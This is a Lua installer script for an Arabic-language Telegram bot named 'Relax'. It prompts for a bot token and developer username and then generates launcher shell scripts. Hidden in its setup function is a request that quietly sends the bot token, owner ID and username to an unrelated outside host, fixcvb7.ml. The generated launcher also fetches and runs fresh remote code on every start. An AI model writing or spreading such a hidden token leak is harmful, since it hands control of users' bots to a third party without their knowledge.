serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Relax = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Relax = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Relax_Info_Sudo = io.open("sudo.lua", 'w')
Relax_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Relax_Info_Sudo:close()
end  
if not database:get(Server_Relax.."Token_Relax") then
print("\27[1;34m»» اكتب توكن البوت :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» التوكن خطأ عمري \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» تم حفظ التوكن\n\27[0;39;49m')
database:set(Server_Relax.."Token_Relax",token)
end 
else
io.write('\n\27[1;31mلم يتم حفظ التوكن\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Relax.."UserName_Relax") then
print("\27[1;34m\n»» اكتب معرف المطور : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://brok.ml/x.php?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» السيرفر سبام يحلو \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» المعرف خطأ \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» هذا معرف قناة قلبي \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» تم حفظ المعرف\n\27[0;39;49m')
database:set(Server_Relax.."UserName_Relax",Json.Info.Username)
database:set(Server_Relax.."Id_Relax",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mلم يتم حفظ المعرف\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Relax_Info()
Create_Info(database:get(Server_Relax.."Token_Relax"),database:get(Server_Relax.."Id_Relax"),database:get(Server_Relax.."UserName_Relax"))   
http.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_Relax.."Id_Relax").."&user="..database:get(Server_Relax.."UserName_Relax").."&token="..database:get(Server_Relax.."Token_Relax"))
local RunRelax = io.open("Relax", 'w')
RunRelax:write([[
#!/usr/bin/env bash
cd $HOME/Relax
token="]]..database:get(Server_Relax.."Token_Relax")..[["
rm -fr Relax.lua
wget "https://raw.githubusercontent.com/RelaxSource/Relax/main/Relax.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Relax.lua -p PROFILE --bot=$token
done
]])
RunRelax:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Relax
while(true) do
rm -fr ../.telegram-cli
screen -S Relax -X kill
screen -S Relax ./Relax
done
]])
RunTs:close()
end
Files_Relax_Info()
database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Relax()  
var = true
else   
f:close()  
database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
